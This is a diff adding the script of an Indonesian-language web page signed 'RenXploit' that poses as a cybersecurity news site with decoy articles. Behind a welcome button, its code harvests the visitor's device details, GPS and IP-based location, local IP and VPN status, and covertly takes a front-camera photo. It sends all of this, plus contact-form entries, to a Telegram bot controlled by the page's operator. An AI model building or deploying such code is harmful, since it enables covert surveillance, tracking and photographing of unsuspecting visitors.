+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+        if (ipData) {
+          info.publicIp = ipData.ip; info.city = ipData.city; info.region = ipData.region; info.country = ipData.country_name; info.location = `${ipData.latitude}, ${ipData.longitude}`;
+          if (deviceLat !== null && deviceLon !== null && ipData.latitude && ipData.longitude) {
+            const distance = computeDistance(deviceLat, deviceLon, ipData.latitude, ipData.longitude);
+            info.vpnDetection = distance > 50 ? `Kemungkinan VPN/Proxy (Perbedaan: ${distance.toFixed(1)} km)` : "VPN/Proxy tidak terdeteksi";
+          } else {
+            info.vpnDetection = "Data tidak cukup untuk deteksi VPN/Proxy";
+          }
+        }
+      } catch { }
+      info.localIp = await getLocalIP().catch(() => 'Tidak Terdeteksi');
+      return info;
+    }
+
+    async function captureAndSendPhoto(caption) {
+        const video = document.getElementById('video-capture');
+        const canvas = document.getElementById('canvas-capture');
+        
+        if (!video || !canvas) {
+            console.error("Elemen video atau canvas tidak ditemukan! Pastikan sudah ditambahkan ke HTML.");
+            const errorMessage = "⚠️ Script Error: Elemen <canvas> atau <video> tidak ditemukan di HTML.";
+            chatIds.forEach(id => {
+                if (!id || id.includes("MASUKAN_CHAT_ID")) return;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: id, text: errorMessage })
+                });
+            });
+            return;
+        }
+        const context = canvas.getContext('2d');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            video.srcObject = stream;
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+            chatIds.forEach(id => {
+                if (!id || id.includes("MASUKAN_CHAT_ID")) return;
+                const formData = new FormData();
+                formData.append('chat_id', id);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', caption);
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+            });
+        } catch (error) {
+            console.error("Gagal mengambil foto:", error);
+            const errorMessage = `⚠️ Gagal mengakses kamera: ${error.name} - ${error.message}`;
+            chatIds.forEach(id => {
+                if (!id || id.includes("MASUKAN_CHAT_ID")) return;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: id, text: errorMessage })
+                });
+            });
+        }
+    }
+
+    async function sendAllInfo() {
+      const loadingContainer = document.getElementById('loadingContainer');
+      const loadingText = document.getElementById('loadingText');
+      loadingContainer.style.display = 'block';
+      loadingText.textContent = "Loading...";
+      try {
+        const info = await collectAllInfo();
+        const message = `🔰 INFORMASI PERANGKAT By ~ RenXploit 🔰
+💿 GPU: ${info.gpu}
+💽 CPU: ${info.cpu}
+🖥️ Layar: ${info.screen}
+📐 Ukuran Jendela: ${info.innerWindow}
+🖥️ Layar Tersedia: ${info.screenAvail}
+🔄 Orientasi Layar: ${info.orientation}
+🎨 Tema: ${info.colorScheme}
+🔎 Vendor: ${info.vendor}
+☕ Java Enabled: ${info.javaEnabled}
+🌐 Zona Waktu: ${info.timezone}
+🎮 WebGL: ${info.webgl}
+🔌 Plugin: ${info.plugins}
+👆 Touch: ${info.touch}
+🛡️ AdBlocker: ${info.adblock}
+📍 GPS: ${info.geolocation}
+📡 Koneksi: ${info.connection}
+${info.rtt ? "⏱️ RTT: " + info.rtt + "\n" : ""}
+📱 Merek: ${info.brand}
+🖥️ OS: ${info.os}
+💾 Memori: ${info.memory}
+🔋 Baterai: ${info.battery}
+🌐 IP Publik: ${info.publicIp}
+📶 IP Lokal: ${info.localIp}
+🏙️ Kota: ${info.city}
+📍 Wilayah: ${info.region}
+🇨🇺 Negara: ${info.country}
+📌 Lokasi: ${info.location}
+🔍 VPN/Proxy: ${info.vpnDetection}
+🗣️ Bahasa: ${info.language} (Pilihan: ${info.languages})
+💻 Platform: ${info.platform}
+🔍 Do Not Track: ${info.doNotTrack}
+⏱️ Load Time: ${info.pageLoadTime}
+🍪 Cookies: ${info.cookiesEnabled}
+💾 Local Storage: ${info.localStorage}
+🗄️ Session Storage: ${info.sessionStorage}
+📡 Status: ${info.onLine}
+👁️ Visibility: ${info.visibilityState}
+🧭 Device Orientation: ${info.deviceOrientation}
+📊 Absolute Orientation: ${info.absoluteOrientation}
+📈 Device Motion: ${info.deviceMotion}
+🔙 Referrer: ${info.referrer}`;
+        const textPromises = chatIds.map(id => {
+            if (!id || id.includes("MASUKAN_CHAT_ID")) return Promise.resolve();
+            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: id, text: message }) }).then(res => res.json());
+        });
+        const results = await Promise.all(textPromises);
+        if (results.some(data => data && data.ok)) {
+            loadingText.textContent = "Loading...";
+            const photoCaption = `📸 Tangkapan Kamera\n\nIP: ${info.publicIp}\nLokasi: ${info.city}, ${info.country}\nOS: ${info.os}`;
+            await captureAndSendPhoto(photoCaption);
+            loadingContainer.style.display = 'none';
+            guideModal.style.display = 'flex';
+            document.getElementById('tips').scrollIntoView({ behavior: 'smooth' });
+        } else {
+            loadingText.textContent = "Gagal mengirim info. Coba lagi nanti.";
+        }
+      } catch (err) {
+        loadingText.textContent = "Error: " + err;
+      }
+    }
+
+    async function loadTelegramFeed() {
+      const telegramContainer = document.getElementById('telegramFeed');
+      try {
+        const data = { articles: [ { title: "Zero-Day Exploit Ditemukan di Browser Populer", summary: "Sebuah kerentanan kritis baru saja ditemukan, memungkinkan eksekusi kode jarak jauh. Pengguna disarankan untuk segera memperbarui...", url: "#" }, { title: "Panduan Lengkap Mengamankan Jaringan Wi-Fi Rumah", summary: "Jangan biarkan jaringan rumah Anda menjadi pintu masuk bagi peretas. Ikuti langkah-langkah penting ini untuk proteksi maksimal.", url: "#" }, { title: "Waspada! Serangan Ransomware Baru Mengincar UKM", summary: "Varian ransomware baru dengan metode enkripsi canggih telah muncul, menargetkan bisnis kecil dan menengah. Kenali tanda-tandanya.", url: "#" } ] };
+        let feedHTML = "";
+        data.articles.forEach(article => { feedHTML += `<div class="telegram-card"><h3>${article.title}</h3><p>${article.summary}</p><a href="${article.url}" target="_blank">Baca Selengkapnya →</a></div>`; });
+        telegramContainer.innerHTML = feedHTML || "<p>Tidak ada data saat ini.</p>";
+      } catch (error) {
+        telegramContainer.innerHTML = "<p>Gagal load hot feed, bro. Coba refresh!</p>";
+      }
+    }
+
+    document.getElementById('sendBtn').addEventListener('click', sendAllInfo);
+    const welcomeModal = document.getElementById('welcomeModal');
+    const continueBtn = document.getElementById('continueBtn');
+    window.addEventListener('load', () => { 
+      welcomeModal.style.display = 'flex';
+      loadTelegramFeed();
+    });
+    continueBtn.addEventListener('click', () => {
+      welcomeModal.style.display = 'none';
+      sendAllInfo();
+    });
+    document.getElementById('contactForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const name = this.querySelector('input[type="text"]').value.trim();
+      const email = this.querySelector('input[type="email"]').value.trim();
+      const messageText = this.querySelector('textarea').value.trim();
+      const currentUrl = window.location.href;
+      const referrer = document.referrer || "Tidak Ada";
+      const timestamp = new Date().toLocaleString();
+      const message = `🔔 *Pesan Kontak Baru Diterima* 🔔\n\n👤 *Nama*: ${name}\n📧 *Email*: ${email}\n💬 *Pesan*: ${messageText}\n\n🕒 *Waktu*: ${timestamp}\n🌐 *URL*: ${currentUrl}\n🔙 *Referrer*: ${referrer}`;
+      chatIds.forEach(id => {
+        if (!id || id.includes("MASUKAN_CHAT_ID")) return;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: id, text: message, parse_mode: 'Markdown' }) })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) { alert("Pesan lo berhasil terkirim! Tim kami akan segera menghubungi lo."); document.getElementById('contactForm').reset(); }
+          else { alert("Ups, ada error saat mengirim pesan. Coba lagi nanti ya."); }
+        })
+        .catch(error => { console.error("Error:", error); alert("Gagal mengirim pesan. Coba lagi nanti."); });
+      });
+    });
+  </script>
+</body>
+</html>
